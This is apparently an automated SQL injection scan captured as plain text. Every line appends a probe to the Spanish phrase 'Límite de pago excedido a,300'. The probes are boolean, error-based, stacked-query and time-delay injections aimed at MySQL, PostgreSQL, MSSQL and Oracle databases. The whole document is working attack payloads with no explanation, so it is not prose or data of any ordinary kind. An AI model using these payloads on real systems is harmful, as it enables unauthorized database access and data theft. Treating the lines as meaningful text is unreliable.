Límite de pago excedido a,300).\"..)\'.\"\'
Límite de pago excedido a,300\'GrVYEQ<\'\">oRkprx
Límite de pago excedido a,300) AND 5000=3309 AND (6569=6569
Límite de pago excedido a,300) AND 4880=4880 AND (4463=4463
Límite de pago excedido a,300 AND 6610=7103
Límite de pago excedido a,300 AND 4880=4880
Límite de pago excedido a,300 AND 8335=6378-- KqXl
Límite de pago excedido a,300 AND 4880=4880-- NLPl
Límite de pago excedido a,300\') AND 6864=9361 AND (\'ZcBX\'=\'ZcBX
Límite de pago excedido a,300\') AND 4880=4880 AND (\'FLjT\'=\'FLjT
Límite de pago excedido a,300\' AND 2413=6402 AND \'cwmj\'=\'cwmj
Límite de pago excedido a,300\' AND 4880=4880 AND \'BkbE\'=\'BkbE
Límite de pago excedido a,300%\' AND 4134=8645 AND \'%\'=\'
Límite de pago excedido a,300%\' AND 4880=4880 AND \'%\'=\'
Límite de pago excedido a,300) AND 4244=CAST((CHR(113)||CHR(118)||CHR(120)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (4244=4244) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC) AND (8801=8801
Límite de pago excedido a,300 AND 4244=CAST((CHR(113)||CHR(118)||CHR(120)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (4244=4244) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC)
Límite de pago excedido a,300 AND 4244=CAST((CHR(113)||CHR(118)||CHR(120)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (4244=4244) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC)-- NTUW
Límite de pago excedido a,300\') AND 4244=CAST((CHR(113)||CHR(118)||CHR(120)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (4244=4244) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC) AND (\'unTS\'=\'unTS
Límite de pago excedido a,300\' AND 4244=CAST((CHR(113)||CHR(118)||CHR(120)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (4244=4244) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC) AND \'owkg\'=\'owkg
Límite de pago excedido a,300%\' AND 4244=CAST((CHR(113)||CHR(118)||CHR(120)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (4244=4244) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC) AND \'%\'=\'
Límite de pago excedido a,300) AND 2574=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(120)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (2574=2574) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113))) AND (9750=9750
Límite de pago excedido a,300 AND 2574=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(120)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (2574=2574) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113)))
Límite de pago excedido a,300 AND 2574=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(120)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (2574=2574) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113)))-- Chbt
Límite de pago excedido a,300\') AND 2574=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(120)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (2574=2574) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113))) AND (\'EmzA\'=\'EmzA
Límite de pago excedido a,300\' AND 2574=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(120)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (2574=2574) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113))) AND \'jFGU\'=\'jFGU
Límite de pago excedido a,300%\' AND 2574=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(120)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (2574=2574) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113))) AND \'%\'=\'
Límite de pago excedido a,300) AND 6665=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(120)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (6665=6665) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND (6951=6951
Límite de pago excedido a,300 AND 6665=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(120)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (6665=6665) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)
Límite de pago excedido a,300 AND 6665=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(120)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (6665=6665) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)-- vcHA
Límite de pago excedido a,300\') AND 6665=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(120)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (6665=6665) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND (\'xGFZ\'=\'xGFZ
Límite de pago excedido a,300\' AND 6665=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(120)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (6665=6665) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND \'vGDj\'=\'vGDj
Límite de pago excedido a,300%\' AND 6665=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(120)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (6665=6665) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND \'%\'=\'
Límite de pago excedido a,300);SELECT SLEEP(5)#
Límite de pago excedido a,300;SELECT SLEEP(5)#
Límite de pago excedido a,300\');SELECT SLEEP(5)#
Límite de pago excedido a,300\';SELECT SLEEP(5)#
Límite de pago excedido a,300%\';SELECT SLEEP(5)#
Límite de pago excedido a,300);SELECT PG_SLEEP(5)--
Límite de pago excedido a,300;SELECT PG_SLEEP(5)--
Límite de pago excedido a,300\');SELECT PG_SLEEP(5)--
Límite de pago excedido a,300\';SELECT PG_SLEEP(5)--
Límite de pago excedido a,300%\';SELECT PG_SLEEP(5)--
Límite de pago excedido a,300);WAITFOR DELAY \'0:0:5\'--
Límite de pago excedido a,300;WAITFOR DELAY \'0:0:5\'--
Límite de pago excedido a,300\');WAITFOR DELAY \'0:0:5\'--
Límite de pago excedido a,300\';WAITFOR DELAY \'0:0:5\'--
Límite de pago excedido a,300%\';WAITFOR DELAY \'0:0:5\'--
Límite de pago excedido a,300);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(117)||CHR(117)||CHR(118)||CHR(98),5) FROM DUAL--
Límite de pago excedido a,300;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(117)||CHR(117)||CHR(118)||CHR(98),5) FROM DUAL--
Límite de pago excedido a,300\');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(117)||CHR(117)||CHR(118)||CHR(98),5) FROM DUAL--
Límite de pago excedido a,300\';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(117)||CHR(117)||CHR(118)||CHR(98),5) FROM DUAL--
Límite de pago excedido a,300%\';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(117)||CHR(117)||CHR(118)||CHR(98),5) FROM DUAL--
Límite de pago excedido a,300) AND SLEEP(5) AND (3091=3091
Límite de pago excedido a,300 AND SLEEP(5)
Límite de pago excedido a,300 AND SLEEP(5)-- EQMG
Límite de pago excedido a,300\') AND SLEEP(5) AND (\'Ojkb\'=\'Ojkb
Límite de pago excedido a,300\' AND SLEEP(5) AND \'fmXZ\'=\'fmXZ
Límite de pago excedido a,300%\' AND SLEEP(5) AND \'%\'=\'
Límite de pago excedido a,300) AND 1111=(SELECT 1111 FROM PG_SLEEP(5)) AND (8023=8023
Límite de pago excedido a,300 AND 1111=(SELECT 1111 FROM PG_SLEEP(5))
Límite de pago excedido a,300 AND 1111=(SELECT 1111 FROM PG_SLEEP(5))-- MPiV
Límite de pago excedido a,300\') AND 1111=(SELECT 1111 FROM PG_SLEEP(5)) AND (\'hIQT\'=\'hIQT
Límite de pago excedido a,300\' AND 1111=(SELECT 1111 FROM PG_SLEEP(5)) AND \'lapz\'=\'lapz
Límite de pago excedido a,300%\' AND 1111=(SELECT 1111 FROM PG_SLEEP(5)) AND \'%\'=\'
Límite de pago excedido a,300) WAITFOR DELAY \'0:0:5\' AND (4303=4303
Límite de pago excedido a,300 WAITFOR DELAY \'0:0:5\'
Límite de pago excedido a,300 WAITFOR DELAY \'0:0:5\'-- droV
Límite de pago excedido a,300\') WAITFOR DELAY \'0:0:5\' AND (\'wexe\'=\'wexe
Límite de pago excedido a,300\' WAITFOR DELAY \'0:0:5\' AND \'AuWj\'=\'AuWj
Límite de pago excedido a,300%\' WAITFOR DELAY \'0:0:5\' AND \'%\'=\'
Límite de pago excedido a,300) AND 1333=DBMS_PIPE.RECEIVE_MESSAGE(CHR(112)||CHR(120)||CHR(118)||CHR(101),5) AND (2434=2434
Límite de pago excedido a,300 AND 1333=DBMS_PIPE.RECEIVE_MESSAGE(CHR(112)||CHR(120)||CHR(118)||CHR(101),5)
Límite de pago excedido a,300 AND 1333=DBMS_PIPE.RECEIVE_MESSAGE(CHR(112)||CHR(120)||CHR(118)||CHR(101),5)-- yjHX
Límite de pago excedido a,300\') AND 1333=DBMS_PIPE.RECEIVE_MESSAGE(CHR(112)||CHR(120)||CHR(118)||CHR(101),5) AND (\'OVba\'=\'OVba
Límite de pago excedido a,300\' AND 1333=DBMS_PIPE.RECEIVE_MESSAGE(CHR(112)||CHR(120)||CHR(118)||CHR(101),5) AND \'HgFz\'=\'HgFz
Límite de pago excedido a,300%\' AND 1333=DBMS_PIPE.RECEIVE_MESSAGE(CHR(112)||CHR(120)||CHR(118)||CHR(101),5) AND \'%\'=\'
